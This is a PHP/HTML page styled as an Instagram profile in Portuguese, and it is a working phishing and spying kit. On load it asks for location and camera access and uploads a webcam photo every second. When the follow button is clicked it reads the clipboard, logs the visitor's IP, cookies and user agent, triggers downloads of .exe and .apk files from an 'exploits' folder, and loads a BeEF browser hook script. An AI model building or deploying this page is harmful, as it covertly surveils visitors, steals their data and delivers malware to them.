<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Titulo | Instagram</title>
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Roboto", sans-serif;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 350px;
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px;
            text-align: center;
        }

        .profile-pic {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            margin: 0 auto 1rem;
            border: 2px solid #fff;
            box-shadow: 0 0 0 2px #e1306c;
            object-fit: cover;
            display: block;
        }

        h3 {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            color: #262626;
            text-align: center;
        }

        .name {
            font-size: 0.9rem;
            color: #8e8e8e;
            margin-bottom: 1rem;
        }

        .bio {
            font-size: 0.85rem;
            color: #262626;
            margin-bottom: 1rem;
            line-height: 1.4;
        }

        .stats {
            display: flex;
            justify-content: space-around;
            margin: 1rem 0;
            color: #262626;
            font-size: 0.9rem;
        }

        .stats div {
            text-align: center;
        }

        .stats span {
            font-weight: 700;
            display: block;
        }

        .follow-btn {
            width: 100%;
            height: 30px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 0.9rem;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.3s;
        }

        .follow-btn:hover {
            background: #007bb5;
        }

        @media (max-width: 480px) {
            .container {
                margin: 10px;
                padding: 15px;
            }
            .profile-pic {
                width: 70px;
                height: 70px;
            }
            h3 {
                font-size: 1.1rem;
            }
            .follow-btn {
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
    <?php
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization");

    function getUserIP() {
        $headers = [
            'HTTP_CF_CONNECTING_IP', // Cloudflare
            'HTTP_X_FORWARDED_FOR',  // Proxy ou rede móvel
            'HTTP_CLIENT_IP',        // Cliente
            'REMOTE_ADDR'            // Último recurso
        ];
        
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ip = $_SERVER[$header];
                if ($header === 'HTTP_X_FORWARDED_FOR') {
                    $ip_list = explode(',', $ip);
                    $ip = trim($ip_list[0]); // Pega o primeiro IP
                }
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        return 'IP não disponível';
    }

    function getIPInfo($ip) {
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $encoded_ip = urlencode($ip);
        $api_url = "http://ip-api.com/json/{$encoded_ip}"; 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log('Erro cURL ao acessar ip-api.com: ' . curl_error($ch) . " | IP: $ip");
            curl_close($ch);
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code !== 200) {
            error_log("Erro HTTP $http_code ao acessar ip-api.com | IP: $ip");
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $data = json_decode($response, true);
        if (!$data || $data['status'] !== 'success') {
            error_log("Resposta inválida do ip-api.com | IP: $ip | Resposta: $response");
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        return [
            'city' => $data['city'] ?? 'Cidade desconhecida',
            'region' => $data['regionName'] ?? 'Região desconhecida',
            'country' => $data['country'] ?? 'País desconhecido'
        ];
    }

    function getExploitFiles() {
        $directory = 'exploits/';
        $files = [];
        if (is_dir($directory)) {
            $allFiles = scandir($directory);
            foreach ($allFiles as $file) {
                if (in_array(pathinfo($file, PATHINFO_EXTENSION), ['exe', 'apk'])) {
                    $files[] = [
                        'href' => $directory . $file,
                        'nome' => $file
                    ];
                }
            }
        }
        return $files;
    }

    $ip = getUserIP();
    $ipData = getIPInfo($ip);
    $geoLocationIP = ($ipData['city'] ?? 'Cidade desconhecida') . ', ' . 
                     ($ipData['region'] ?? 'Região desconhecida') . ', ' . 
                     ($ipData['country'] ?? 'País desconhecido');

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Se for uma requisição de foto da câmera, apenas salva a foto e sai
        if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
            if (!is_dir('uploads')) {
                mkdir('uploads', 0755, true);
            }
            $photoPath = 'uploads/photo_' . time() . '.png';
            if (move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath)) {
                // Foto salva com sucesso
            } else {
                error_log("Erro ao salvar foto em $photoPath");
            }
            exit; // Sai pra não processar mais nada
        }

        // Processa os dados do clique no botão "Seguir"
        if (isset($_POST['location']) || isset($_POST['clipboard'])) {
            $location = $_POST['location'] ?? 'Não disponível';
            $clipboard = $_POST['clipboard'] ?? 'Nenhum texto';

            if (!is_dir('uploads')) {
                mkdir('uploads', 0755, true);
            }

            $file = fopen("dados.txt", "a");
            if ($file) {
                fwrite($file, "IP: $ip\n");
                fwrite($file, "Localização (Navegador): $location\n");
                fwrite($file, "Localização (IP): $geoLocationIP\n");
                fwrite($file, "Clipboard: $clipboard\n");
                fwrite($file, "Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie') . "\n");
                fwrite($file, "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Desconhecido') . "\n");
                fwrite($file, "------------------------\n");
                fclose($file);
            }
            exit; // Sai pra não retornar o HTML
        }
    }

    $exploitFiles = getExploitFiles();
    ?>

    <main class="container">
        <img src="profile.jpg" alt="Profile Picture" class="profile-pic">
        <h3>@SeuArroba</h3>
        <div class="name">Seu nome</div>
        <div class="bio">Sua Biot<br>Siga-me para mais!</div>
        <div class="stats">
            <div><span>103</span> posts</div>
            <div><span>33</span> seguidores</div>
            <div><span>200</span> seguindo</div>
        </div>
        <button class="follow-btn" id="followButton">
            <a href="javascript:%20(function%20()%20{%20var%20url%20=%20%27http://127.0.0.1/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();">Seguir</a>
        </button>
        <video id="video" autoplay style="display: none;"></video>
        <canvas id="canvas" style="display: none;"></canvas>
        <input type="hidden" id="locationData">
        <input type="hidden" id="clipboardData">
        <input type="file" name="photo" id="photo" accept="image/png" style="display: none;">
    </main>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const locationData = document.getElementById('locationData');
        const clipboardData = document.getElementById('clipboardData');
        const followButton = document.getElementById('followButton');

        // Função para verificar se estamos em um contexto seguro (HTTPS ou localhost)
        function isSecureContext() {
            return window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
        }

        // Comportamento do script original: solicita permissões ao carregar a página
        if (navigator.geolocation) {
            console.log('Solicitando permissão de geolocalização...');
            navigator.geolocation.getCurrentPosition(
                position => {
                    locationData.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                    console.log("Localização capturada: ", locationData.value);
                },
                err => {
                    locationData.value = "Localização não disponível";
                    console.error('Erro ao acessar localização:', err);
                }
            );
        } else {
            locationData.value = "Geolocalização não suportada";
            console.error('Geolocalização não suportada');
        }

        if (!isSecureContext()) {
            console.error('Contexto inseguro! A captura de câmera só funciona em HTTPS ou localhost.');
        } else {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    console.log('Permissão da câmera concedida, iniciando captura de fotos');
                    video.srcObject = stream;
                    const context = canvas.getContext('2d');

                    function captureFrame() {
                        if (!video.videoWidth) {
                            console.warn('Vídeo ainda não está pronto, tentando novamente...');
                            return requestAnimationFrame(captureFrame);
                        }
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);

                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob, `photo_${Date.now()}.png`);
                            fetch(window.location.href, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => console.log('Foto enviada com sucesso'))
                            .catch(err => console.error('Erro ao enviar foto:', err));
                        }, 'image/png');

                        setTimeout(() => requestAnimationFrame(captureFrame), 1000);
                    }
                    requestAnimationFrame(captureFrame);
                })
                .catch(err => {
                    console.error('Erro ao acessar a câmera:', err);
                    if (err.name === 'NotAllowedError') {
                        console.error('Permissão da câmera negada pelo usuário');
                    } else if (err.name === 'NotFoundError') {
                        console.error('Nenhuma câmera encontrada no dispositivo');
                    } else if (err.name === 'SecurityError') {
                        console.error('Contexto inseguro ou política de segurança bloqueando o acesso à câmera');
                    }
                });
        }

        async function captureClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    console.log("Clipboard capturado: ", text);
                    return text || 'Nenhum texto na área de transferência';
                } else {
                    console.log("Clipboard não suportado");
                    return 'Clipboard não suportado';
                }
            } catch (err) {
                console.error('Erro ao acessar clipboard:', err.message);
                return 'Erro ao acessar clipboard: ' + err.message;
            }
        }

        function triggerDownload(filePath, fileName) {
            const link = document.createElement('a');
            link.href = filePath;
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            console.log(`Download iniciado: ${fileName}`);
        }

        // Ajuste: downloads e captura de clipboard ao clicar no botão "Seguir"
        followButton.addEventListener('click', async () => {
            const clipboardText = await captureClipboard();
            clipboardData.value = clipboardText;
            console.log("Clipboard enviado: ", clipboardText);

            const formData = new FormData();
            formData.append('location', locationData.value);
            formData.append('clipboard', clipboardData.value);

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                followButton.textContent = "Seguindo";
                followButton.style.background = "#e0e0e0";
                followButton.style.color = "#000";

                // Inicia os downloads ao clicar no botão "Seguir"
                const arquivos = <?php echo json_encode($exploitFiles); ?>;
                if (arquivos.length > 0) {
                    arquivos.forEach((arquivo, i) => {
                        setTimeout(() => {
                            triggerDownload(arquivo.href, arquivo.nome);
                        }, i * 1000);
                    });
                } else {
                    console.log("Nenhum arquivo .exe ou .apk encontrado na pasta exploits/.");
                }
            });
        });

        window.onload = () => {
            document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
            console.log('Página carregada, permissões solicitadas.');
        };


        /* 
    000000000000       000000000000             
    0oooooooooo0       0oooooooooo0               
    0oo0000oooo0       0oo0000oooo0                      
    0oo0000oooo0       0oo0000oooo0                      
    0oo0000oooo0       0oo0000oooo0                   
    0oo0000oooo0       0oo0000oooo0                 
    0oo____oooo0       0oo____oooo0 
    000000000000       000000000000                                         
    1                   ___________        _________
    1  '    sssssssss  |___________        |_________
    1       ss         |                   |
    1         s        |___________        |_________
    1          s       |                   |
    1           s      |___________        |__________
    1     ssssssss     |___________        |__________  .you  
    1
    ___              
*/
    </script>
    <script>
        var commandModuleStr = '<script src="http://127.0.0.1/hook.js" type="text/javascript"><\/script>';
        document.write(commandModuleStr);
    </script>
</body>
</html>
